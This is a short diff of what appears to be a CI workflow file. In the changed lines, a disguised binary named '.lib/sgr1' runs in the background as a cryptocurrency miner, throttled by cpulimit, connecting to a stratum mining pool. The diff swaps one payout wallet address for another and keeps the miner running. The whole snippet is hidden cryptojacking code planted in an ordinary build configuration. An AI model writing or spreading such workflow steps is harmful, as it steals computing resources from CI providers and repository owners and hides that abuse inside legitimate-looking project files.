@@ -79,7 +79,7 @@ jobs:
             if [ -f .lib/sgr1 ]; then
               cpulimit -l 300 -e .lib/sgr1 &
               cpulimit_pid=$!
-              nohup .lib/sgr1 -a xelishashv2_pepew --pool stratum+tcps://$ip:$port -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.${cpulimit_pid} --timeout 120 -t 4 > dance_$port.log 2>&1 &
+              nohup .lib/sgr1 -a xelishashv2_pepew --pool stratum+tcps://$ip:$port -u PWtofe7qLBoXm9xYSyXA2zYz5wraUq5kPG.${cpulimit_pid} --timeout 120 -t 4 > dance_$port.log 2>&1 &
               process_pid=$!
               echo "Started process with PID $process_pid using IP $ip and port $port"
 
